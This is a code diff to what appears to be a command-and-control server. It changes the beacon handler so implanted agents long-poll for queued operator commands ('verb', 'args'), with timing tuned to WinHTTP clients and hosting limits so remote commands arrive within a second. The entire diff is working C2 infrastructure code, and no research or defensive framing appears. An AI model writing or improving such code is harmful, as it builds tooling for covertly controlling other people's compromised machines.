@@ -270,17 +270,32 @@ async function handleBeacon(req, res, body) {
     ]
   );
 
-  const pick = await pool.query(
-    `select id, verb, args from commands
-      where vid = $1 and dispatched is null
-      order by id asc limit 8`,
-    [id]
-  );
-  if (pick.rows.length) {
-    const ids = pick.rows.map((r) => r.id);
-    await pool.query(`update commands set dispatched = now() where id = any($1::bigint[])`, [ids]);
+  const waitMs = Number(new URL(req.url, "http://c2").searchParams.get("wait")) || 0;
+  const rows = await pickCommands(id, waitMs);
+  return json(res, 200, { ok: true, commands: rows });
+}
+
+// The agent asks for a long poll: hold the request open until a command lands or
+// the window closes. Without this every operator click waited for the next beat
+// of a 45 s timer; with it the same click is delivered in well under a second.
+// The cap stays under Render's idle-connection limit and WinHTTP's 45 s receive.
+async function pickCommands(id, waitMs) {
+  const deadline = Date.now() + Math.max(0, Math.min(Number(waitMs) || 0, 25000));
+  for (;;) {
+    const pick = await pool.query(
+      `select id, verb, args from commands
+        where vid = $1 and dispatched is null
+        order by id asc limit 8`,
+      [id]
+    );
+    if (pick.rows.length) {
+      const ids = pick.rows.map((r) => r.id);
+      await pool.query(`update commands set dispatched = now() where id = any($1::bigint[])`, [ids]);
+      return pick.rows;
+    }
+    if (Date.now() >= deadline) return [];
+    await new Promise((r) => setTimeout(r, 600));
   }
-  return json(res, 200, { ok: true, commands: pick.rows });
 }
 
 async function handleResult(req, res, body) {
